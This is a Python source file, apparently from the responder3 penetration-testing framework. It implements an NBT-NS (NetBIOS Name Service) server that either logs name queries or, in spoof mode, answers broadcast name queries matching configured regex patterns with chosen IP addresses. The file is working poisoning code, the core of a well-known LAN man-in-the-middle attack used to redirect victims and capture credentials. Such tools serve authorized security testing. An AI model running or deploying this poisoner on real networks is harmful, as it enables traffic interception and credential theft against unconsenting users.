import re
import socket
import struct
import logging
import asyncio
import ipaddress
import traceback
import collections

from responder3.core.commons import *
from responder3.protocols.NetBIOS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession

class NBTNSGlobalSession():
	def __init__(self, server_properties):
		self.server_properties = server_properties
		self.settings = server_properties.settings

		self.spooftable = collections.OrderedDict()
		self.poisonermode = PoisonerMode.ANALYSE

		self.parse_settings()

	def parse_settings(self):
		if self.settings is None:
			self.log('No settings defined, adjusting to Analysis functionality!')
		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.poisonermode = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.poisonermode == PoisonerMode.SPOOF:
				for entry in self.settings['spooftable']:
					for regx in entry:
						self.spooftable[re.compile(regx)] = ipaddress.ip_address(entry[regx])


class NBTNSSession(ResponderServerSession):
	pass

class NBTNS(ResponderServer):
	def custom_socket(server_properties):
		sock = setup_base_socket(server_properties, bind_ip_override = ipaddress.ip_address('0.0.0.0'))
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
		return sock

	def init(self):
		self.parser = NBTNSPacket

	@asyncio.coroutine
	def parse_message(self):
		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	@asyncio.coroutine
	def send_data(self, data, addr = None):
		yield from asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
		return

	@asyncio.coroutine
	def run(self):
		try:
			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
			if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
				for q in msg.Questions:
					self.log_poisonresult(requestName = q.QNAME.name)

			else: #poisoning
				answers = []
				for q in msg.Questions:
					for spoof_regx in self.globalsession.spooftable:
						spoof_ip = self.globalsession.spooftable[spoof_regx]
						if spoof_regx.match(q.QNAME.name.lower().strip()):
							self.log_poisonresult(requestName = q.QNAME, poisonName = str(spoof_regx), poisonIP = spoof_ip)
							res = NBResource()
							res.construct(q.QNAME, NBRType.NB, spoof_ip)
							answers.append(res)
							break
						else:
							print('RE %s did not match %s' % (spoof_regx, q.QNAME.name))
				
				response = NBTNSPacket()
				response.construct(
					 TID = msg.NAME_TRN_ID, 
					 response = NBTSResponse.RESPONSE, 
					 opcode   = NBTNSOpcode.QUERY, 
					 nmflags  = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
					 answers  = answers
				)

				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout =1)

		except Exception as e:
			raise e